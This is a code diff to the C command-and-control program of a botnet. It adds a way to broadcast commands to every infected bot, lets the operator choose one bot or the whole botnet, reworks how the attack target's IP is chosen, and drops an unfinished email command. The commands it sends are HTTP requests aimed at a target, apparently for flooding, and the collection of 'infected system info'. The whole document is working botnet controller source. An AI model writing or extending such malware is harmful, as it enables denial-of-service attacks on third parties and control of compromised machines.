@@ -71,7 +71,7 @@ void parent(/*int pid*/)
     while (1)
     {
 
-        char command[11] ;
+        char command[11];
         printf("\nInsert Command : ");
 
         fflush(stdin);
@@ -81,7 +81,6 @@ void parent(/*int pid*/)
             fflush(stdin);
             clearerr(stdin);
             continue;
-            
         }
         else
         {
@@ -114,33 +113,62 @@ void parent(/*int pid*/)
             }
             // maybe just one or multiple | statements
 
-            else if (strcmp(command, HTTP_REQ) == 0 | strcmp(command, EMAIL) == 0 | strcmp(command, SYS_INFO) == 0)
+            else if (strcmp(command, HTTP_REQ) == 0 | strcmp(command, SYS_INFO) == 0)
             {
-                printf("\nChoose bot to which send command ");
 
-                ret = list_botnet(0);
+                char target_ip[INET_ADDRSTRLEN] = {0};
+                char broadcast[3] = {0};
 
-                if (ret < 0)
-                    continue;
-
-                char bot_id[100];
-                fgets(bot_id, 100, stdin);
-                int bot = atoi(bot_id);
-
-                if (botExists(bot) < 0)
+                if (strcmp(command, SYS_INFO) == 0)
                 {
-                    printf("\nNot a valid bot id ");
-                    continue;
+                    strncpy(target_ip, SELF, strlen(SELF));
                 }
                 else
                 {
-                    sendCommand(command, bot);
+                    getTargetIp(target_ip);
+                }
+
+
+                printf("\n Do you want to send command to all botnet or to a specific bot? [A,s] \n");
+                fgets(broadcast, sizeof(char) * 3, stdin);
+                fflush(stdin);
+
+
+                if (strcmp(broadcast, "s\n") != 0)
+                {
+                    printf("Broadcastring commmand to botnet\n");
+
+                    broadcastCommand(command, target_ip);
+                }
+                else
+                {
+
+                    printf("\nChoose bot to which send command ");
+
+                    ret = list_botnet(0);
+
+                    if (ret < 0)
+                        continue;
+
+                    char bot_id[100];
+                    fgets(bot_id, 100, stdin);
+                    int bot = atoi(bot_id);
+
+                    if (botExists(bot) < 0)
+                    {
+                        printf("\nNot a valid bot id ");
+                        continue;
+                    }
+                    else
+                    {
+                        sendCommand(command, bot, target_ip);
+                    }
                 }
             }
             else
             {
-                printf("\nError, command not supported choose one from the following available commands: \n %s \n %s \n %s \n %s \n %s ",
-                       HTTP_REQ, LIST, EMAIL, SYS_INFO, QUIT);
+                printf("\nError, command not supported choose one from the following available commands: \n %s \n %s \n %s \n %s ",
+                       HTTP_REQ, LIST, SYS_INFO, QUIT);
                 continue;
             }
         }
@@ -175,7 +203,7 @@ void child()
     }
 }
 
-void sendCommand(char *command, int bot_id)
+void sendCommand(char *command, int bot_id, char *target_ip)
 {
 
     CURL *curl;
@@ -192,7 +220,6 @@ void sendCommand(char *command, int bot_id)
         char url[255] = {0};
 
         char bot_ip[INET_ADDRSTRLEN] = {0};
-        char target_ip[INET_ADDRSTRLEN] = {0};
         long bot_port;
 
         if (botExists(bot_id) < 0)
@@ -208,33 +235,15 @@ void sendCommand(char *command, int bot_id)
             return;
         }
 
-        printf("\n Do you want insert target.s ip by hostname? [Y,n]\n");
-        char byHostName[3] = {0};
-        fgets(byHostName, sizeof(char)*3, stdin);
-        fflush(stdin);
-
-        if(strcmp(byHostName,"n\n") == 0){
-            printf("\nSubmit target's ip in dot decimal notation:");
-            fgets(target_ip, sizeof(target_ip), stdin);
-            fflush(stdin);
-        }else{
-            printf("\nSubmit target's hostname: ");
-            char hostname[255] = {0};
-            fflush(stdin);
-            fgets(hostname, sizeof(char) * 255, stdin);
-            hostname[strcspn(hostname, "\n")] = 0;
-            if(fromHostnameToIp(target_ip,hostname) < 0 ){
-                printf("Could not send command, wrong hostname");
-                return ;
-            }
-            
+        printf("Updating bot info\n");
+        if (strcmp(target_ip, "self") == 0)
+        {   
+            updateBotInfo(bot_id, bot_ip, command);
         }
-        
-
-
-        target_ip[strcspn(target_ip, "\n")] = 0;
-
-        updateBotInfo(bot_id, target_ip, command);
+        else
+        {
+            updateBotInfo(bot_id, target_ip, command);
+        }
 
         // * BUILDING REQUEST
         // url = (char *)malloc(sizeof(PROTOCOL) + sizeof(bot_ip) + 1);
@@ -243,8 +252,8 @@ void sendCommand(char *command, int bot_id)
 
         strcat(url, bot_ip);
 
+        printf("%s",url);
         curl_easy_setopt(curl, CURLOPT_PORT, bot_port);
-
         //! for each command you need to update bot info about action and target
         if (strcmp(command, HTTP_REQ) == 0)
         {
@@ -262,14 +271,6 @@ void sendCommand(char *command, int bot_id)
             free(new_url);
         }
 
-        if (strcmp(command, EMAIL) == 0)
-        {
-            printf("\nSending emails ");
-
-            strcat(url, "/email");
-
-            // TODO email batch
-        }
         if (strcmp(command, SYS_INFO) == 0)
         {
             printf("\nRetrieving infected system info");
@@ -281,7 +282,6 @@ void sendCommand(char *command, int bot_id)
 
         res = curl_easy_perform(curl);
 
-        
         curl_easy_cleanup(curl);
     }
 }
@@ -347,4 +347,25 @@ int handle_request(void *cls, struct MHD_Connection *connection, const char *url
     MHD_destroy_response(response);
 
     return ret;
+}
+
+void broadcastCommand(char *command, char *target_ip)
+{
+
+    
+
+    active_bots *bot = botnet;
+
+    while (bot != NULL)
+    {
+        if(bot->bot_id == 0) {
+            bot = bot->next;
+            continue;
+        }
+        sendCommand(command, bot->bot_id, target_ip);
+        bot = bot->next;
+    }
+
+   
+
 }
